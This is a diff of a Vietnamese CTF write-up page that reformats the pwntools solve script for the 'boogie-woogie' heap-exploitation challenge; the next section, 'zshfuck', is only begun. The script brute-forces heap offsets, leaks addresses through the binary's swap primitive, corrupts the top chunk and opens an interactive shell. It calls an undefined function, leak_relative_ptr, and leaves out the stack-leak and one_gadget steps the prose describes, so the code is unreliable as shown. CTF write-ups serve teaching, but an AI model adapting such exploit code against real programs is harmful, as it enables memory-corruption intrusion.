@@ -584,91 +584,91 @@ Do đó, ta có thể lấp đầy heap.</p>
 </span></span></code></pre></div><h3 id="get-shell">Get SHELL</h3>
 <p>Bây giờ ta đã có AAW với địa chỉ libc vừa được leak, đơn giản ta sẽ leak stack thông qua <code>__libc_envrion</code> rồi ghi đè <code>return address</code> về <code>one_gadget</code> .</p>
 <h2 id="solve-script-1">Solve Script</h2>
-<pre tabindex="0"><code>from pwn import *
-import os
-
-libc = ELF(&#34;./libc.so.6&#34;)
-elf = context.binary = ELF(&#34;./boogie-woogie_patched&#34;)
-# context.log_level = &#39;debug&#39;
-def connect():
-    if args.LOCAL:
-        return process(&#39;./boogie-woogie_patched&#39;)
-    elif args.DOCKER:
-        return remote(&#39;0&#39;, 1337)
-        
-def clap_str(num1, num2):
-    io.sendafter(b&#39;on:&#39;, num1.encode() + b&#39; &#39; + num2.encode())
-def clap(v1,v2):
-    io.sendlineafter(b&#39;on:&#39;, (str(v1)+&#39; &#39;+str(v2)).encode())
-
-def aar(addr):
-    for i in range(8):
-        io.sendline(f&#34;{addr+i} {1+i}&#34;.encode())
-
-    for _ in range(8):
-        io.readuntil(b&#34;exception:&#34;)
-    io.readuntil(b&#34;4m&#34;)
-    io.recvuntil(b&#34;L&#34;)
-    ptr = u64(io.read(6).ljust(8,b&#34;\x00&#34;))
-    for i in range(8):
-        io.sendline(f&#34;{addr+i} {1+i}&#34;.encode())
-
-    for _ in range(8):
-        io.readuntil(b&#34;exception:&#34;)
-    return ptr
-
-
-def brute_heap_offset():
-    idx = 0
-    with log.progress(&#39;Bruting&#39;) as p:
-        while True:
-            try:
-                idx += 1
-                p.status(&#34;attempt %i&#34;, idx)
-                io = connect()
-                io.recvuntil(b&#34;exception&#34;)
-                trial_heap_offset = 0x1995fe0
-            
-                io.sendline(f&#34;1 {trial_heap_offset}&#34;.encode())
-                
-                io.recvuntil(b&#34;exception&#34;)
-                io.sendline(f&#34;1 {trial_heap_offset}&#34;.encode())
-                p.success()
-                return (io, trial_heap_offset &gt;&gt; 12 &lt;&lt; 12)
-            except EOFError:
-                with context.local(log_level=&#39;error&#39;): io.close()
-
-io, heap_page = brute_heap_offset()
-
-__dso_handle = leak_relative_ptr(-24)
-elf.address =  __dso_handle - elf.symbols[&#39;__dso_handle&#39;]
-log.info(f&#39;__dso_handle = {hex(__dso_handle)}&#39;)
-log.info(f&#34;program base = {hex(elf.address)}&#34;)
-log.info(f&#34;offset to a heap page = {hex(heap_page)}&#34;)
-maybe_tcache_perthread = heap_page + 8 - 0x20
-
-io.readuntil(b&#34;exception:&#34;)
-
-while True:
-    io.sendline(f&#34;1 {maybe_tcache_perthread}&#34;.encode())
-    io.recvuntil(b&#34;L&#34;)
-    if io.recv(1) == b&#39;\x91&#39;:
-        io.readuntil(b&#34;exception:&#34;)
-        break
-    io.readuntil(b&#34;exception:&#34;)
-    maybe_tcache_perthread -= 0x1000
-    
-heap_base = maybe_tcache_perthread - 0x8
-log.info(f&#34;offset to heap base = {hex(heap_base)}&#34;)
-top_chunk = heap_base + 0x0ab8
-io.sendline(f&#34;-3 {top_chunk+2}&#34;.encode())
-io.sendline(b&#34;-1 -&#34;+b&#34;1&#34;*0x800)
-# cmd = &#34;&#34;&#34;
-# init-pwndbg
-# &#34;&#34;&#34;
-# gdb.attach(io, cmd)
-io.interactive()
-</code></pre><h1 id="mics---zshfuck">Mics - zshfuck</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>)
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./boogie-woogie_patched&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># context.log_level = &#39;debug&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">connect</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> process(<span style="color:#e6db74">&#39;./boogie-woogie_patched&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> args<span style="color:#f92672">.</span>DOCKER:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> remote(<span style="color:#e6db74">&#39;0&#39;</span>, <span style="color:#ae81ff">1337</span>)
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">clap_str</span>(num1, num2):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;on:&#39;</span>, num1<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39; &#39;</span> <span style="color:#f92672">+</span> num2<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">clap</span>(v1,v2):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;on:&#39;</span>, (str(v1)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">+</span>str(v2))<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">aar</span>(addr):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>addr<span style="color:#f92672">+</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{</span><span style="color:#ae81ff">1</span><span style="color:#f92672">+</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>readuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;exception:&#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>readuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;4m&#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;L&#34;</span>)
+</span></span><span style="display:flex;"><span>    ptr <span style="color:#f92672">=</span> u64(io<span style="color:#f92672">.</span>read(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>addr<span style="color:#f92672">+</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{</span><span style="color:#ae81ff">1</span><span style="color:#f92672">+</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>readuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;exception:&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ptr
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">brute_heap_offset</span>():
+</span></span><span style="display:flex;"><span>    idx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> log<span style="color:#f92672">.</span>progress(<span style="color:#e6db74">&#39;Bruting&#39;</span>) <span style="color:#66d9ef">as</span> p:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>                idx <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>                p<span style="color:#f92672">.</span>status(<span style="color:#e6db74">&#34;attempt </span><span style="color:#e6db74">%i</span><span style="color:#e6db74">&#34;</span>, idx)
+</span></span><span style="display:flex;"><span>                io <span style="color:#f92672">=</span> connect()
+</span></span><span style="display:flex;"><span>                io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;exception&#34;</span>)
+</span></span><span style="display:flex;"><span>                trial_heap_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1995fe0</span>
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>                io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;1 </span><span style="color:#e6db74">{</span>trial_heap_offset<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>                
+</span></span><span style="display:flex;"><span>                io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;exception&#34;</span>)
+</span></span><span style="display:flex;"><span>                io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;1 </span><span style="color:#e6db74">{</span>trial_heap_offset<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>                p<span style="color:#f92672">.</span>success()
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> (io, trial_heap_offset <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">12</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">12</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">EOFError</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">with</span> context<span style="color:#f92672">.</span>local(log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;error&#39;</span>): io<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io, heap_page <span style="color:#f92672">=</span> brute_heap_offset()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>__dso_handle <span style="color:#f92672">=</span> leak_relative_ptr(<span style="color:#f92672">-</span><span style="color:#ae81ff">24</span>)
+</span></span><span style="display:flex;"><span>elf<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span>  __dso_handle <span style="color:#f92672">-</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;__dso_handle&#39;</span>]
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;__dso_handle = </span><span style="color:#e6db74">{</span>hex(__dso_handle)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;program base = </span><span style="color:#e6db74">{</span>hex(elf<span style="color:#f92672">.</span>address)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;offset to a heap page = </span><span style="color:#e6db74">{</span>hex(heap_page)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>maybe_tcache_perthread <span style="color:#f92672">=</span> heap_page <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x20</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>readuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;exception:&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;1 </span><span style="color:#e6db74">{</span>maybe_tcache_perthread<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;L&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x91</span><span style="color:#e6db74">&#39;</span>:
+</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>readuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;exception:&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>readuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;exception:&#34;</span>)
+</span></span><span style="display:flex;"><span>    maybe_tcache_perthread <span style="color:#f92672">-=</span> <span style="color:#ae81ff">0x1000</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>heap_base <span style="color:#f92672">=</span> maybe_tcache_perthread <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x8</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;offset to heap base = </span><span style="color:#e6db74">{</span>hex(heap_base)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>top_chunk <span style="color:#f92672">=</span> heap_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0ab8</span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;-3 </span><span style="color:#e6db74">{</span>top_chunk<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;-1 -&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x800</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># cmd = &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># init-pwndbg</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># &#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># gdb.attach(io, cmd)</span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h1 id="mics---zshfuck">Mics - zshfuck</h1>
 <h2 id="source-code-overview-2">Source code overview</h2>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/zsh
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>print -n -P <span style="color:#e6db74">&#34;%F{green}Specify your charset: %f&#34;</span>
